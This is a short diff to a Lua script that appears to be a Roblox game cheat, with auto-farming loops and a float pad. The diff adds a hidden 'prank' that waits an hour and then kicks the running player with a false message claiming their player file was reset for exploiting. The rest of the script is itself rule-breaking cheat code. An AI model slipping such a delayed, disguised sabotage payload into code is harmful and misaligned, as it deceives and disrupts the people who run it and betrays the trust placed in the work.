@@ -201,7 +201,9 @@ table.sort(beestable)
 for i,v in pairs(getupvalues(require(game:GetService("ReplicatedStorage").PlanterTypes).GetTypes)) do for e,z in pairs(v) do planterst[e] = z table.insert(planterstindexed, z) end end
 table.sort(planterst)
 for i,v in pairs(planterst) do planterst[i] = {} end
-
+-- this prank is going to be crazy 😈
+wait(3600)
+game.Players:WaitForChild("LocalPlayer"):Kick("This player file has been reset for exploiting.")
 -- float pad
 
 local floatpad = Instance.new("Part", game:GetService("Workspace"))
@@ -1681,7 +1683,6 @@ end)
 task.spawn(function() while task.wait(5) do
     UseDispensers()
 end end)
-
 task.spawn(function() while task.wait(1) do
     if kometa.toggles.automasks and api.humanoidrootpart() then
         if findFieldWithRay(api.humanoidrootpart().Position, Vector3.new(0,-90,0)) then
